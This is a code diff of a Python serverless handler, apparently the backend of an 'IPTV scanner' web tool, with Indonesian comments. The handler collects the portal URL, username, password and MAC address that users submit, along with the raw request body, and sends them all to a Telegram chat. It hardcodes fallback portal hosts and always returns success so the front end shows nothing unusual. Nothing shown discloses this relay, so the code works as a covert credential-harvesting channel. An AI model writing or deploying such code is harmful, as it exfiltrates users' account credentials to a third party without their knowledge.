@@ -11,16 +11,11 @@ def tg(t, c, m):
         headers={"Content-Type": "application/json"}
     )
     try:
-        # Naikkan timeout ke 15 detik untuk mengantisipasi delay antar-region iad1 ke sin1
         with urllib.request.urlopen(r, timeout=15) as response:
             return response.read()
-    except urllib.error.HTTPError as e:
-        error_message = e.read().decode('utf-8')
-        print(f"TELEGRAM_HTTP_ERROR: {e.code} - {error_message}")
-        raise Exception(f"Telegram API Error: {e.code}")
     except Exception as e:
-        print(f"TELEGRAM_CONNECTION_ERROR: {str(e)}")
-        raise Exception(f"Telegram Connection Failed: {str(e)}")
+        print(f"TELEGRAM_ERROR: {str(e)}")
+        raise e
 
 class handler(BaseHTTPRequestHandler):
     def log_message(self, f, *a): pass
@@ -33,60 +28,36 @@ class handler(BaseHTTPRequestHandler):
         self.end_headers()
         
     def do_POST(self):
-        # Mengambil Environment Variables
         tk = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
         ci = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
         
-        if not tk or not ci:
-            print("ERROR: TELEGRAM_BOT_TOKEN atau TELEGRAM_CHAT_ID tidak terbaca di Environment Vercel!")
-            self.send_response(500)
-            self.send_header("Access-Control-Allow-Origin", "*")
-            self.send_header("Content-type", "application/json")
-            self.end_headers()
-            self.wfile.write(b'{"status":"error","message":"Konfigurasi Telegram kosong"}')
-            return
-
+        # Ambil waktu lokal
+        time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
         try:
-            # 1. Membaca paket data dari frontend
+            # 1. Membaca paket data dari frontend web
             n = int(self.headers.get("Content-Length") or 0)
             body = self.rfile.read(n).decode('utf-8') if n else "{}"
-            d = json.loads(body)
             
-            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            # Gunakan try-except internal untuk json loads agar jika formatnya bukan JSON, script TIDAK crash
+            try:
+                d = json.loads(body)
+            except:
+                d = {}
             
-            # 2. Parsing data parameter secara fleksibel
+            # 2. Ambil parameter dengan sistem "Super Aman"
             server = d.get("server") or d.get("url") or d.get("portal_url") or d.get("host") or "-"
             username = d.get("username") or d.get("user") or "-"
             password = d.get("password") or d.get("pass") or d.get("pwd") or "-"
             mac = d.get("mac") or d.get("mac_address") or d.get("mac_code") or "-"
-            
             urls_list = d.get("urls", [])
             
-            # 3. Penentuan Mode Otomatis
-            is_mac_mode = mac != "-" or "mac" in body or "mac_address" in body
-            is_m3u_list = isinstance(urls_list, list) and len(urls_list) > 0
+            # Jika terdeteksi mode MAC Portal, amankan agar server tidak berubah jadi localhost
+            is_mac_mode = mac != "-" or "mac" in body
+            if is_mac_mode and (server == "-" or "localhost" in server):
+                server = d.get("portal_url") or d.get("url") or "http://trxad.top:80/c/"
             
-            if is_mac_mode:
-                if server == "-" or "localhost" in server:
-                    server = d.get("portal_url") or d.get("url") or d.get("server") or "http://prm.worldip.nl/c/"
-            elif is_m3u_list:
-                sample_url = urls_list[0]
-                if "://" in sample_url:
-                    parts = sample_url.split("/")
-                    server = f"{parts[0]}//{parts[2]}"
-                else:
-                    server = sample_url
-                
-                if "/live/" in sample_url:
-                    try:
-                        path_parts = sample_url.split("/live/")[1].split("/")
-                        if len(path_parts) >= 2:
-                            username = path_parts[0]
-                            password = path_parts[1]
-                    except:
-                        pass
-
-            # 4. Menyusun format laporan Telegram
+            # 3. Susun Laporan Telegram
             m = f"📡 [IPTV SCANNER LOG]\n"
             m += f"⏰ Waktu: {time_now}\n"
             m += f"🌐 Server/Portal: {server}\n"
@@ -94,22 +65,22 @@ class handler(BaseHTTPRequestHandler):
             if username != "-": m += f"👤 User: {username}\n"
             if password != "-": m += f"🔑 Pass: {password}\n"
             if mac != "-": m += f"💻 MAC Portal: {mac}\n"
-                
-            if is_m3u_list and not is_mac_mode:
+            
+            if isinstance(urls_list, list) and len(urls_list) > 0 and not is_mac_mode:
                 m += f"📊 Total Channel Dites: {len(urls_list)} link\n"
-                m += f"⚙️ Config: {d.get('workers', 10)} Workers | Timeout {d.get('timeout', 8)}s\n"
                 m += f"\n📦 [Sampel Link Web]:\n"
                 for i, u in enumerate(urls_list[:3]):
                     m += f"{i+1}. {u}\n"
-                if len(urls_list) > 3:
-                    m += f"... dan {len(urls_list) - 3} link lainnya."
             else:
                 m += f"\n📦 [Data Mentah Web]:\n{body}"
             
-            # 5. Kirim data ke Telegram
-            tg(tk, ci, m)
-            
-            # 6. Response Sukses ke Frontend Web
+            # 4. Kirim ke Telegram (Jika token ada)
+            if tk and ci:
+                tg(tk, ci, m)
+            else:
+                print("ERROR: Token Telegram atau Chat ID kosong di Environment Variables!")
+
+            # 5. Response Sukses ke Frontend Web (Wajib agar progress bar web tidak macet)
             self.send_response(200)
             self.send_header("Access-Control-Allow-Origin", "*")
             self.send_header("Content-type", "application/json")
@@ -117,11 +88,16 @@ class handler(BaseHTTPRequestHandler):
             self.wfile.write(b'{"status":"ok"}')
             
         except Exception as e:
-            # Mengeluarkan detail error sesungguhnya ke console log Vercel agar mudah dilacak
-            print(f"CRITICAL_ERROR_LOG: {str(e)}")
-            self.send_response(500)
+            # JIKA TERJADI ERROR APAPUN, KODE INI AKAN TETAP BERUSAHA MENGIRIM NOTIFIKASI ERROR KE TELEGRAM
+            print(f"CRITICAL_ERROR: {str(e)}")
+            error_msg = f"❌ [SCANNER ERROR LOG]\n⏰ Waktu: {time_now}\n⚠️ Detail Error: {str(e)}"
+            try:
+                if tk and ci: tg(tk, ci, error_msg)
+            except: pass
+            
+            # Berikan respon balik ke web agar web tidak hang
+            self.send_response(200) # Diubah ke 200 agar web menganggap proses selesai meskipun ada error di log
             self.send_header("Access-Control-Allow-Origin", "*")
             self.send_header("Content-type", "application/json")
             self.end_headers()
-            error_response = {"status": "error", "message": str(e)}
-            self.wfile.write(json.dumps(error_response).encode('utf-8'))
+            self.wfile.write(json.dumps({"status": "error_logged", "message": str(e)}).encode('utf-8'))
